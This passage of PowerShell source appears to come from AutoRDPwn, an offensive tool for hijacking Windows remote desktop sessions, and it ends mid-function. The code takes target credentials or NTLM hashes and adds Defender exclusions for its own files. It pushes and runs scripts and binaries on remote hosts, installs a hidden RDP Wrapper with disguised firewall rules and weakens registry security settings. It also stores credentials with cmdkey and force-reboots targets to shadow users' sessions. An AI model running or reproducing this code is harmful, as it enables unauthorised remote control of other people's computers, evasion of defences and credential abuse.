        @{ Key = 'Mode'; Label = 'Mode' }
    )
    $index = 0
    while ($true) {
        Show-ARTargetFormScreen -Index $index
        if ($script:ARTestMode) { return $false }
        try { $key = [Console]::ReadKey($true) } catch { return $false }
        switch ($key.Key) {
            'UpArrow' {
                $index--
                if ($index -lt 0) { $index = $fields.Count - 1 }
            }
            'DownArrow' {
                $index++
                if ($index -ge $fields.Count) { $index = 0 }
            }
            'Home' { $index = 0 }
            'End' { $index = $fields.Count - 1 }
            'Enter' {
                Edit-ARTargetField -Field $fields[$index]
            }
            'Escape' { return $true }
            default {
                $character = $key.KeyChar.ToString().ToUpperInvariant()
                if ($character -eq 'S') { return $true }
                if ($character -eq 'Q') { return $false }
            }
        }
    }
}

function Read-ARLineTargetForm {
    $labels = @(
        @{ Key = 'Computer'; Text = 'Target host' },
        @{ Key = 'User'; Text = 'User' },
        @{ Key = 'Hash'; Text = 'NTLM hash' },
        @{ Key = 'Domain'; Text = 'Domain' },
        @{ Key = 'AttackerIP'; Text = 'Attacker IP' }
    )
    foreach ($field in $labels) {
        $current = [string]$script:ARTarget[$field.Key]
        $value = Read-ARLineValue (' {0} [{1}]: ' -f $field.Text, $current)
        if ($null -eq $value) { continue }
        $value = $value.Trim()
        if ($value -ne '') { $script:ARTarget[$field.Key] = $value }
        elseif ($field.Key -eq 'Computer') { $script:ARTarget['Computer'] = 'localhost' }
    }
    $password = Read-ARSecretValue ' New password (Enter keeps, - clears): '
    if ($null -ne $password) {
        if ($password -eq '-') { $script:ARTarget['Password'] = '' }
        elseif ($password -ne '') { $script:ARTarget['Password'] = $password }
    }
    $mode = Read-ARLineValue (' Mode [1 control, 2 view] [{0}]: ' -f $script:ARTarget['Mode'])
    if ($null -ne $mode) {
        $mode = $mode.Trim()
        if ($mode -match '^1$|control') { $script:ARTarget['Mode'] = 'control' }
        elseif ($mode -match '^2$|view') { $script:ARTarget['Mode'] = 'view' }
    }
}

function Show-ARLanguagePicker {
    $languages = @('English', 'Spanish', 'French', 'German', 'Italian', 'Russian', 'Portuguese')
    $index = [Array]::IndexOf($languages, $script:ARLocaleName)
    if ($index -lt 0) { $index = 0 }
    while ($true) {
        Clear-ARScreen
        $width = Get-ARConsoleWidth
        $inner = $width - 1
        Write-ARLine ' Language' 'Yellow'
        Write-ARLine ('-' * $inner) 'DarkGray'
        for ($i = 0; $i -lt $languages.Count; $i++) {
            $marker = if ($i -eq $index) { '>' } else { ' ' }
            $line = ' {0} {1,2}. {2}' -f $marker, ($i + 1), $languages[$i]
            if ($i -eq $index) { Write-ARLine $line 'Black' 'Gray' }
            else { Write-ARLine $line 'Gray' }
        }
        Write-ARLine ('-' * $inner) 'DarkGray'
        Write-ARLine ' Up/Down move  Enter select  Esc cancel' 'DarkGray'
        if ($script:ARTestMode) { return '' }
        try { $key = [Console]::ReadKey($true) } catch { return '' }
        switch ($key.Key) {
            'UpArrow' {
                $index--
                if ($index -lt 0) { $index = $languages.Count - 1 }
            }
            'DownArrow' {
                $index++
                if ($index -ge $languages.Count) { $index = 0 }
            }
            'Enter' {
                $script:ARLocaleName = $languages[$index]
                return $languages[$index]
            }
            'Escape' { return '' }
            default {
                $character = $key.KeyChar.ToString().ToUpperInvariant()
                if ($character -eq 'Q') { return '' }
                if ($character -match '^[1-7]$') {
                    $languageIndex = ([int]$character) - 1
                    $script:ARLocaleName = $languages[$languageIndex]
                    return $languages[$languageIndex]
                }
            }
        }
    }
}

function Show-ARTui {
    param([string]$InitialId = '')
    if (-not (Get-ARActionById $InitialId)) {
        $first = Get-ARActionCatalog | Where-Object { $_.Kind -eq 'Action' } | Select-Object -First 1
        if ($first) { $script:ARSelectedId = $first.Id }
    }
    else {
        $script:ARSelectedId = $InitialId
    }
    $script:ARScroll = 0
    while ($true) {
        Show-ARTuiScreen
        if ($script:ARTestMode) { return 'TEST' }
        try { $key = [Console]::ReadKey($true) } catch { return 'QUIT' }
        switch ($key.Key) {
            'UpArrow' { Move-ARSelection -Delta -1 }
            'DownArrow' { Move-ARSelection -Delta 1 }
            'PageUp' { Move-ARSelectionPage -Pages -1 }
            'PageDown' { Move-ARSelectionPage -Pages 1 }
            'Home' {
                $first = Get-ARFilteredCatalog -Filter $script:ARFilter | Where-Object { $_.Kind -eq 'Action' } | Select-Object -First 1
                if ($first) { $script:ARSelectedId = $first.Id; $script:ARScroll = 0 }
            }
            'End' {
                $last = Get-ARFilteredCatalog -Filter $script:ARFilter | Where-Object { $_.Kind -eq 'Action' } | Select-Object -Last 1
                if ($last) { $script:ARSelectedId = $last.Id }
            }
            'Enter' { return ('ACTION:' + $script:ARSelectedId) }
            'Escape' {
                if ($script:ARFilter -ne '') {
                    $script:ARFilter = ''
                    Set-ARStatus 'Filter cleared' 'Info'
                }
            }
            'F1' { Show-ARHelp }
            default {
                $character = $key.KeyChar.ToString().ToUpperInvariant()
                if ($character -eq 'Q' -or $character -eq 'X') { return 'QUIT' }
                if ($character -eq 'T') {
                    if (Show-ARTargetForm) { Set-ARStatus 'Target updated' 'Ok' }
                }
                if ($character -eq 'L') { return 'LANGUAGE' }
                if ($character -eq '/') {
                    Show-ARTuiScreen -Prompt 'Filter:'
                    try { $filterValue = $Host.UI.ReadLine() } catch { $filterValue = $null }
                    if ($null -ne $filterValue) {
                        $script:ARFilter = $filterValue.Trim()
                        if ($script:ARFilter -ne '') {
                            $rows = @(Get-ARFilteredCatalog -Filter $script:ARFilter | Where-Object { $_.Kind -eq 'Action' })
                            if ($rows.Count -gt 0) { $script:ARSelectedId = $rows[0].Id; $script:ARScroll = 0 }
                            else { Set-ARStatus 'No action matches the filter' 'Warn' }
                        }
                    }
                }
                if ($character -eq 'R') {
                    $script:ARFilter = ''
                    Set-ARStatus 'Filter cleared' 'Info'
                }
            }
        }
    }
}

function Show-ARLineMenu {
    Clear-ARScreen
    $width = Get-ARConsoleWidth
    $inner = $width - 1
    Write-ARLine (Format-ARText ('AutoRDPwn v5.2 - line mode  |  {0}' -f $script:ARLocaleName) $inner) 'Yellow'
    Write-ARLine ('-' * $inner) 'DarkGray'
    Write-ARLine (Format-ARText ('Target: {0}  User: {1}  Mode: {2}' -f $script:ARTarget['Computer'], (Get-ARTargetUserLabel), $script:ARTarget['Mode']) $inner) 'Gray'
    Write-ARLine ''
    foreach ($item in Get-ARActionCatalog) {
        if ($item.Kind -eq 'Group') {
            Write-ARLine ''
            Write-ARLine (Format-ARText (' -- {0} --' -f $item.Title) $inner) 'Blue'
            continue
        }
        Write-ARLine (Format-ARText (' [{0,3}] {1}' -f $item.Id, $item.Title) $inner) 'Gray'
        Write-ARLine (Format-ARText ('       {0}' -f $item.Description) $inner) 'DarkGray'
    }
    Write-ARLine ''
    Write-ARLine ' [L] language  [T] target  [Q] quit' 'DarkGray'
    if ($script:ARTestMode) { return '' }
    $selection = Read-ARLineValue ' Choose an action:'
    if ($null -eq $selection) { return 'QUIT' }
    return (Resolve-ARSelection $selection)
}

function Show-ARLineTargetForm {
    Clear-ARScreen
    Write-ARLine 'Target editor (line mode)' 'Yellow'
    Read-ARLineTargetForm
    Set-ARStatus 'Target updated' 'Ok'
}

$script:ARSession = $null
$script:AROverrideCredential = $null
$script:ARDefenderAvailable = $false
$script:ARDefenderAddedPaths = New-Object System.Collections.Generic.List[string]
$script:ARWorkDirs = New-Object System.Collections.Generic.List[string]
$script:ARTemporaryFiles = New-Object System.Collections.Generic.List[string]
$script:ARRemoteTempDirs = New-Object System.Collections.Generic.List[string]
$script:ARHashUserName = ''
$script:ARCmdKeyTargets = New-Object System.Collections.Generic.List[string]
$script:ARCleanupDone = $false

function Invoke-ARDownload {
    param(
        [Parameter(Mandatory = $true)][string]$Url,
        [Parameter(Mandatory = $true)][string]$OutFile
    )
    $oldProgress = $ProgressPreference
    $ProgressPreference = 'SilentlyContinue'
    try {
        Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -ErrorAction Stop
    }
    catch {
        try { (New-Object Net.WebClient).DownloadFile($Url, $OutFile) }
        catch { throw "Download failed: $Url" }
    }
    finally { $ProgressPreference = $oldProgress }
    if (-not (Test-Path -LiteralPath $OutFile)) { throw "Download failed: $Url" }
}

function Get-ARResourcePath {
    param([Parameter(Mandatory = $true)][string]$RelativePath)
    $normalized = $RelativePath -replace '/', '\'
    $localPath = Join-Path $script:ARRoot $normalized
    if ($script:ARLocal -and (Test-Path -LiteralPath $localPath)) { return $localPath }
    if (Test-Path -LiteralPath $localPath) { return $localPath }
    $parent = Split-Path -Parent $localPath
    if (-not (Test-Path -LiteralPath $parent)) { New-Item -ItemType Directory -Path $parent -Force | Out-Null }
    $url = $script:ARRepository + '/' + ($normalized -replace '\\', '/')
    Invoke-ARDownload -Url $url -OutFile $localPath
    return $localPath
}

function Import-ARToolScript {
    param([Parameter(Mandatory = $true)][string]$RelativePath)
    $path = Get-ARResourcePath $RelativePath
    $before = @(Get-ChildItem -LiteralPath $script:ARTools -File -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName })
    Push-Location $script:ARTools
    try { . $path }
    finally { Pop-Location }
    $after = @(Get-ChildItem -LiteralPath $script:ARTools -File -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName })
    foreach ($file in $after) {
        if ($before -notcontains $file) { $script:ARTemporaryFiles.Add($file) }
    }
}

function Resolve-ARLanguageName {
    param([string]$Name = '')
    $map = @{
        '1' = 'English'; '2' = 'Spanish'; '3' = 'French'; '4' = 'German'
        '5' = 'Italian'; '6' = 'Russian'; '7' = 'Portuguese'
        'en' = 'English'; 'es' = 'Spanish'; 'fr' = 'French'; 'de' = 'German'
        'it' = 'Italian'; 'ru' = 'Russian'; 'pt' = 'Portuguese'
        'english' = 'English'; 'spanish' = 'Spanish'; 'french' = 'French'; 'german' = 'German'
        'italian' = 'Italian'; 'russian' = 'Russian'; 'portuguese' = 'Portuguese'
    }
    if ([string]::IsNullOrWhiteSpace($Name)) {
        $culture = ''
        try { $culture = (Get-Culture).TwoLetterISOLanguageName.ToLowerInvariant() } catch { }
        if ($map.ContainsKey($culture)) { return $map[$culture] }
        return 'English'
    }
    $key = $Name.Trim().ToLowerInvariant()
    if ($map.ContainsKey($key)) { return $map[$key] }
    if ($key.Length -ge 2 -and $map.ContainsKey($key.Substring(0, 2))) { return $map[$key.Substring(0, 2)] }
    return 'English'
}

function Initialize-ARLanguage {
    param([string]$Name = '')
    $resolved = Resolve-ARLanguageName $Name
    $englishPath = Get-ARResourcePath 'Resources\Languages\English.ps1'
    Import-ARLanguage -Path $englishPath -AsFallback
    Import-ARLanguage -Path $englishPath
    if ($resolved -ne 'English') {
        try {
            $languagePath = Get-ARResourcePath ('Resources\Languages\' + $resolved + '.ps1')
            Import-ARLanguage -Path $languagePath
        }
        catch {
            $resolved = 'English'
        }
    }
    Set-ARLanguageName $resolved
}

function Initialize-ARDefender {
    $script:ARDefenderAddedPaths.Clear()
    try {
        $preference = Get-MpPreference -ErrorAction Stop
    }
    catch { return }
    $script:ARDefenderAvailable = $true
    $existingPaths = @($preference.ExclusionPath | Where-Object { $_ })
    $paths = @($script:ARRoot, $script:ARTools, (Join-Path $env:TEMP 'AutoRDPwn'))
    foreach ($path in $paths) {
        if ([string]::IsNullOrWhiteSpace($path)) { continue }
        if (-not (Test-Path -LiteralPath $path)) { continue }
        if ($existingPaths -contains $path) { continue }
        try {
            Add-MpPreference -ExclusionPath $path -ErrorAction Stop
            $script:ARDefenderAddedPaths.Add($path)
        } catch { }
    }
}

function Restore-ARDefender {
    if (-not $script:ARDefenderAvailable) { return }
    foreach ($path in $script:ARDefenderAddedPaths.ToArray()) {
        try { Remove-MpPreference -ExclusionPath $path -ErrorAction Stop } catch { }
    }
    $script:ARDefenderAddedPaths.Clear()
}

function Write-ARInfo { param([string]$Text); Write-Host ('[i] ' + $Text) -ForegroundColor Green }
function Write-ARSuccess { param([string]$Text); Write-Host ('[+] ' + $Text) -ForegroundColor Blue }
function Write-ARWarn { param([string]$Text); Write-Host ('[!] ' + $Text) -ForegroundColor Yellow }
function Write-ARError { param([string]$Text); Write-Host ('[!] ' + $Text) -ForegroundColor Red }
function Write-ARBlank { Write-Host '' }

function Read-ARValue {
    param([string]$Prompt, [string]$Default = '')
    while ($true) {
        $suffix = ': '
        if ($Default -ne '') { $suffix = ' [' + $Default + ']: ' }
        $value = Read-ARLineValue (' ' + $Prompt + $suffix)
        if ($null -eq $value) { $value = '' }
        $value = $value.Trim()
        if ($value -eq '' -and $Default -ne '') { return $Default }
        if ($value -ne '') { return $value }
        Write-ARWarn (Get-ARText 'txt6' 'Incorrect option, try again')
    }
}

function Read-ARSecret {
    param([string]$Prompt = 'Password')
    while ($true) {
        $value = Read-ARSecretValue (' ' + $Prompt + ': ')
        if ($null -ne $value -and $value -ne '') { return $value }
        Write-ARWarn (Get-ARText 'txt6' 'Incorrect option, try again')
    }
}

function Show-ARText {
    param($Value)
    if ($null -eq $Value) { return }
    $text = ($Value | Out-String).TrimEnd()
    if ($text -eq '') { return }
    Write-Host $text
    if ($text.Length -lt 1048576) {
        try { Set-Clipboard -Value $text } catch { }
    }
}

function Test-ARIsLocalTarget {
    $computer = [string]$script:ARTarget['Computer']
    if ([string]::IsNullOrWhiteSpace($computer)) { return $true }
    $names = @('localhost', '127.0.0.1', '::1', '.', $env:COMPUTERNAME)
    try { $names += [System.Net.Dns]::GetHostName() } catch { }
    return ($names -contains $computer)
}

function Get-ARTargetComputer {
    $computer = [string]$script:ARTarget['Computer']
    if ([string]::IsNullOrWhiteSpace($computer)) { return 'localhost' }
    return $computer
}

function Get-ARTargetUserName {
    $user = [string]$script:ARTarget['User']
    $domain = [string]$script:ARTarget['Domain']
    if ($domain -ne '' -and $user -ne '' -and $user -notmatch '\\') { return $domain + '\' + $user }
    return $user
}

function Get-ARPlainPassword {
    $password = [string]$script:ARTarget['Password']
    if ($password -eq '') {
        $password = Read-ARSecret 'Password'
        $script:ARTarget['Password'] = $password
    }
    return $password
}

function Get-ARTargetCredential {
    $user = [string]$script:ARTarget['User']
    if ([string]::IsNullOrWhiteSpace($user)) { return $null }
    $domain = [string]$script:ARTarget['Domain']
    if ($domain -ne '' -and $user -notmatch '\\') { $user = $domain + '\' + $user }
    $password = Get-ARPlainPassword
    $secure = ConvertTo-SecureString -String $password -AsPlainText -Force
    return New-Object System.Management.Automation.PSCredential($user, $secure)
}

function Connect-ARTargetSession {
    param(
        [System.Management.Automation.PSCredential]$Credential = $null,
        [switch]$Force
    )
    $target = Get-ARTargetComputer
    if (-not $Force -and $script:ARSession) {
        $state = ''
        try { $state = [string]$script:ARSession.State } catch { }
        if ($state -eq 'Opened') {
            if ([string]$script:ARSession.ComputerName -eq $target) {
                Set-ARSessionState ('connected (' + $target + ')')
                return $script:ARSession
            }
            Close-ARTargetSession
        }
    }
    if ($null -eq $Credential -and $script:AROverrideCredential) { $Credential = $script:AROverrideCredential }
    if ($null -eq $Credential) { $Credential = Get-ARTargetCredential }
    $parameters = @{ ComputerName = $target; ErrorAction = 'Stop' }
    if ($Credential) { $parameters['Credential'] = $Credential }
    $session = New-PSSession @parameters
    $script:ARSession = $session
    Set-ARSessionState ('connected (' + $target + ')')
    return $session
}

function Close-ARTargetSession {
    if ($script:ARSession) {
        try { Remove-PSSession -Session $script:ARSession -ErrorAction SilentlyContinue } catch { }
        $script:ARSession = $null
    }
    Set-ARSessionState ''
}

function Get-ARTargetSession {
    $session = Connect-ARTargetSession
    if (-not $session) { throw 'Unable to open a PowerShell session to the target.' }
    return $session
}

function Invoke-ARTargetCommand {
    param(
        [Parameter(Mandatory = $true)][scriptblock]$ScriptBlock,
        [object[]]$ArgumentList = @()
    )
    if (Test-ARIsLocalTarget) { return (& $ScriptBlock @ArgumentList) }
    $session = Get-ARTargetSession
    return Invoke-Command -Session $session -ScriptBlock $ScriptBlock -ArgumentList $ArgumentList -ErrorAction Stop
}

function New-ARWorkDirectory {
    $directory = Join-Path $script:ARTools ('work_' + [guid]::NewGuid().ToString('N'))
    New-Item -ItemType Directory -Path $directory -Force | Out-Null
    $script:ARWorkDirs.Add($directory)
    return $directory
}

function Copy-ARFileToTarget {
    param(
        [Parameter(Mandatory = $true)][string]$LocalPath,
        [Parameter(Mandatory = $true)][string]$RemotePath
    )
    if (-not (Test-Path -LiteralPath $LocalPath)) { throw "File not found: $LocalPath" }
    if (Test-ARIsLocalTarget) {
        $directory = New-ARWorkDirectory
        $destination = Join-Path $directory (Split-Path -Leaf $LocalPath)
        Copy-Item -LiteralPath $LocalPath -Destination $destination -Force
        return $destination
    }
    $session = Get-ARTargetSession
    $remoteDirectory = Split-Path -Parent $RemotePath
    Invoke-Command -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
        param($path)
        if (-not (Test-Path -LiteralPath $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
    } -ErrorAction Stop
    try {
        Copy-Item -LiteralPath $LocalPath -Destination $RemotePath -ToSession $session -Force -ErrorAction Stop
    }
    catch {
        $bytes = [System.IO.File]::ReadAllBytes($LocalPath)
        $chunkSize = 48000
        $first = $true
        for ($offset = 0; $offset -lt $bytes.Length; $offset += $chunkSize) {
            $length = [Math]::Min($chunkSize, $bytes.Length - $offset)
            $base64 = [Convert]::ToBase64String($bytes, $offset, $length)
            Invoke-Command -Session $session -ArgumentList $RemotePath, $base64, $first -ScriptBlock {
                param($path, $data, $create)
                $chunk = [Convert]::FromBase64String($data)
                if ($create) {
                    [System.IO.File]::WriteAllBytes($path, $chunk)
                }
                else {
                    $stream = [System.IO.File]::Open($path, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write)
                    try { $stream.Write($chunk, 0, $chunk.Length) } finally { $stream.Dispose() }
                }
            } -ErrorAction Stop
            $first = $false
        }
    }
    return $RemotePath
}

function Invoke-ARTargetPowerShell {
    param(
        [Parameter(Mandatory = $true)][string]$RelativePath,
        [string]$Function = '',
        [hashtable]$Arguments = @{},
        [string]$Command = ''
    )
    $localPath = Get-ARResourcePath $RelativePath
    if (Test-ARIsLocalTarget) {
        $directory = New-ARWorkDirectory
        $scriptPath = Join-Path $directory (Split-Path -Leaf $localPath)
        Copy-Item -LiteralPath $localPath -Destination $scriptPath -Force
        Push-Location $directory
        try {
            return (& {
                param($path, $functionName, $argumentMap, $commandText)
                . $path
                if ($commandText -ne '') { Invoke-Expression $commandText }
                elseif ($functionName -ne '') {
                    $splat = @{}
                    if ($argumentMap) { foreach ($key in $argumentMap.Keys) { $splat[$key] = $argumentMap[$key] } }
                    & $functionName @splat
                }
            } $scriptPath $Function $Arguments $Command)
        }
        finally {
            Pop-Location
            Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    $session = Get-ARTargetSession
    $remoteDirectory = 'C:\Windows\Temp\AutoRDPwn_' + [guid]::NewGuid().ToString('N')
    $scriptPath = Join-Path $remoteDirectory (Split-Path -Leaf $localPath)
    Copy-ARFileToTarget -LocalPath $localPath -RemotePath $scriptPath | Out-Null
    try {
        return Invoke-Command -Session $session -ArgumentList $scriptPath, $Function, $Arguments, $Command -ScriptBlock {
            param($path, $functionName, $argumentMap, $commandText)
            Push-Location (Split-Path -Parent $path)
            try {
                . $path
                if ($commandText -ne '') { Invoke-Expression $commandText }
                elseif ($functionName -ne '') {
                    $splat = @{}
                    if ($argumentMap) { foreach ($key in $argumentMap.Keys) { $splat[$key] = $argumentMap[$key] } }
                    & $functionName @splat
                }
            }
            finally { Pop-Location }
        } -ErrorAction Stop
    }
    finally {
        try { Invoke-Command -Session $session -ArgumentList $remoteDirectory -ScriptBlock { param($path) Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue } -ErrorAction SilentlyContinue } catch { }
    }
}

function Invoke-ARTargetBinary {
    param(
        [Parameter(Mandatory = $true)][string]$LocalPath,
        [string[]]$Arguments = @(),
        [string]$RemoteName = ''
    )
    if ([string]::IsNullOrWhiteSpace($RemoteName)) { $RemoteName = Split-Path -Leaf $LocalPath }
    if (Test-ARIsLocalTarget) {
        return (& $LocalPath @Arguments 2>&1)
    }
    $session = Get-ARTargetSession
    $remoteDirectory = 'C:\Windows\Temp\AutoRDPwn_' + [guid]::NewGuid().ToString('N')
    $remotePath = Join-Path $remoteDirectory $RemoteName
    Copy-ARFileToTarget -LocalPath $LocalPath -RemotePath $remotePath | Out-Null
    try {
        return Invoke-Command -Session $session -ArgumentList $remotePath, $Arguments -ScriptBlock {
            param($path, $binaryArguments)
            & $path @binaryArguments 2>&1
        } -ErrorAction Stop
    }
    finally {
        try { Invoke-Command -Session $session -ArgumentList $remoteDirectory -ScriptBlock { param($path) Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue } -ErrorAction SilentlyContinue } catch { }
    }
}

function Get-ARPayloads {
    param([switch]$IncludeCreateUser)
    $payloads = New-Object System.Collections.Generic.List[string]
    foreach ($name in @('Pwn1', 'Pwn2', 'Pwn3', 'Pwn4')) {
        $value = Get-ARText $name ''
        if (-not [string]::IsNullOrWhiteSpace($value)) { $payloads.Add($value) }
    }
    if ($IncludeCreateUser -or $script:ARCreateUser) {
        $value = Get-ARText 'Pwn5' ''
        if (-not [string]::IsNullOrWhiteSpace($value)) { $payloads.Add($value) }
    }
    return $payloads.ToArray()
}

function Get-ARSessionId {
    param($Lines, [int]$Fallback = 1)
    $ids = New-Object System.Collections.Generic.List[int]
    foreach ($line in @($Lines)) {
        $text = [string]$line
        if ($text -match '^\s*>?\s*.*?\s+(\d+)\s+(?:Active|Disc|Conn|Listen|Inact|Start|Down)\b') {
            $id = [int]$Matches[1]
            if ($id -gt 0 -and -not $ids.Contains($id)) { $ids.Add($id) }
        }
    }
    if ($ids.Count -gt 0) { return ($ids | Sort-Object | Select-Object -First 1) }
    return $Fallback
}

function Install-ARRdpWrap {
    param([Parameter(Mandatory = $true)]$Session)
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-RDPwrap.ps1'
    Push-Location $script:ARTools
    try {
        . $scriptPath
        if (-not $RDPWrap) { throw 'RDPWrap payload is empty.' }
        $directory = New-ARWorkDirectory
        $msiPath = Join-Path $directory 'Setup.msi'
        [System.IO.File]::WriteAllBytes($msiPath, $RDPWrap)
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwn_' + [guid]::NewGuid().ToString('N')
        $remoteMsi = Join-Path $remoteDirectory 'Setup.msi'
        $remoteMsi = Copy-ARFileToTarget -LocalPath $msiPath -RemotePath $remoteMsi
        $ruleName = Get-ARText 'Pwn6' 'RDP session agent'
        Invoke-Command -Session $Session -ArgumentList $remoteMsi, $ruleName -ScriptBlock {
            param($msi, $rule)
            Start-Process -FilePath 'msiexec.exe' -ArgumentList @('/i', $msi, '/quiet', '/qn', '/norestart') -Wait
            netsh advfirewall firewall delete rule name="$rule" 2>&1> $null
            netsh advfirewall firewall add rule name="$rule" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
            netsh advfirewall firewall add rule name="$rule" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
            attrib +h 'C:\Program Files\RDP Wrapper' 2>&1> $null
            attrib +h 'C:\Program Files (x86)\RDP Wrapper' 2>&1> $null
            if (Get-Process msiexec -ErrorAction SilentlyContinue) { Wait-Process -Name msiexec -Timeout 60 -ErrorAction SilentlyContinue }
            Remove-Item -LiteralPath (Split-Path -Parent $msi) -Recurse -Force -ErrorAction SilentlyContinue
        } -ErrorAction Stop
    }
    finally {
        Pop-Location
    }
}

function Invoke-ARShadowEngine {
    $target = Get-ARTargetComputer
    $credential = $script:AROverrideCredential
    if (-not $credential) { $credential = Get-ARTargetCredential }
    $session = Get-ARTargetSession
    $control = $true
    if ($script:ARShadowPreference -in @('see', 'view', 'ver', 'regarder', 'siehe', 'vedere')) { $control = $false }
    elseif ($script:ARShadowPreference -in @('control', 'controlar', 'controle', 'kontrolle', 'controllo')) { $control = $true }
    elseif ([string]$script:ARTarget['Mode'] -eq 'view') { $control = $false }

    Write-ARInfo (Get-ARText 'txt32' 'Changes in the Windows registry made successfully!')
    $previous = Invoke-Command -Session $session -ErrorAction Stop -ScriptBlock {
        $terminalServer = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server'
        $winstation = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
        function Get-ARRemoteValue($path, $name) {
            try {
                $item = Get-ItemProperty -Path $path -Name $name -ErrorAction Stop
                return $item.$name
            }
            catch { return $null }
        }
        $allowRemoteRpc = Get-ARRemoteValue $terminalServer 'AllowRemoteRPC'
        New-ItemProperty -Path $terminalServer -Name 'AllowRemoteRPC' -Value 1 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path $terminalServer -Name 'fDenyTSConnections' -Value 0 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WBEM\CIMOM' -Name 'AllowAnonymousCallback' -Value 1 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'DisableRestrictedAdmin' -Value 0 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' -Name 'AutoShareWks' -Value 1 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' -Name 'AutoShareServer' -Value 1 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance' -Name 'fAllowToGetHelp' -Value 1 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance' -Name 'fAllowFullControl' -Value 1 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path $winstation -Name 'SecurityLayer' -Value 0 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path $winstation -Name 'UserAuthentication' -Value 0 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'LocalAccountTokenFilterPolicy' -Value 1 -PropertyType DWORD -Force | Out-Null
        New-Item -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters' -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters' -Name 'AllowEncryptionOracle' -Value 2 -PropertyType DWORD -Force | Out-Null
        Enable-NetFirewallRule -Name 'RemoteDesktop-Shadow-In-TCP' -ErrorAction SilentlyContinue
        if (-not (Get-NetFirewallRule -Name 'AutoRDPwn-TermService-RPC-In' -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule -Name 'AutoRDPwn-TermService-RPC-In' -DisplayName 'AutoRDPwn TermService RPC' -Direction Inbound -Action Allow -Program 'C:\Windows\System32\svchost.exe' -Service TermService -Protocol TCP -Profile Any -ErrorAction SilentlyContinue | Out-Null
        }
        $caption = (Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        $isServer = $caption -like '*Server*'
        $sessionId = $null
        if (-not $isServer) {
            try { $sessionId = (Get-Process explorer -ErrorAction SilentlyContinue | Sort-Object SessionId | Select-Object -Last 1).SessionId } catch { }
            if (-not $sessionId) { $sessionId = 1 }
        }
        [pscustomobject]@{
            AllowRemoteRpc = $allowRemoteRpc
            IsServer = $isServer
            HostName = $env:COMPUTERNAME
            SessionId = $sessionId
            Caption = $caption
        }
    }

        $plain = ''
        if ($credential) { $plain = $credential.GetNetworkCredential().Password }
        if ($credential -and $plain -ne '') {
            cmdkey.exe "/add:$target" "/user:$($credential.UserName)" "/pass:$plain" 2>&1> $null
            if (-not $script:ARCmdKeyTargets.Contains($target)) { $script:ARCmdKeyTargets.Add($target) }
        }
        Write-ARInfo ((([string](Get-ARText 'txt33' 'Detecting operating system version on')).TrimEnd()) + ' ' + ([string]$previous.HostName).ToLowerInvariant())
        if ($null -eq $previous.AllowRemoteRpc -or [int]$previous.AllowRemoteRpc -eq 0) {
            Write-ARWarn (Get-ARText 'txt86' 'The remote machine needs a reboot to apply the changes, rebooting..')
            try { Invoke-Command -Session $session -ScriptBlock { Restart-Computer -Force } -ErrorAction SilentlyContinue } catch { }
            try { Remove-PSSession -Session $session -ErrorAction SilentlyContinue } catch { }
            $script:ARSession = $null
            Start-Sleep -Seconds 60
            $session = $null
            for ($attempt = 0; $attempt -lt 30; $attempt++) {
                Start-Sleep -Seconds 3
                try {
                    $session = Connect-ARTargetSession -Credential $credential -Force
                    if ($session) { break }
                } catch { }
            }
            if (-not $session) { throw 'The target did not come back after the reboot.' }
        }

        if ($previous.IsServer) {
            try {
                Invoke-Command -Session $session -ScriptBlock {
                    (Get-CimInstance -ClassName Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) | Out-Null
                } -ErrorAction SilentlyContinue | Out-Null
            } catch { }
            $query = Invoke-Command -Session $session -ScriptBlock { query session 2>&1 } -ErrorAction SilentlyContinue
            Show-ARText $query
            $sessionId = Get-ARSessionId $query 1
            if (-not $script:ARInvokedFromOption) {
                $answer = Read-ARValue (Get-ARText 'txt36' 'What session do you want to connect to?') ([string]$sessionId)
                if ($answer -match '^\d+$') { $sessionId = [int]$answer }
            }
        }
        else {
            $sessionId = [int]$previous.SessionId
            if (-not $sessionId) { $sessionId = 1 }
            try { Install-ARRdpWrap -Session $session }
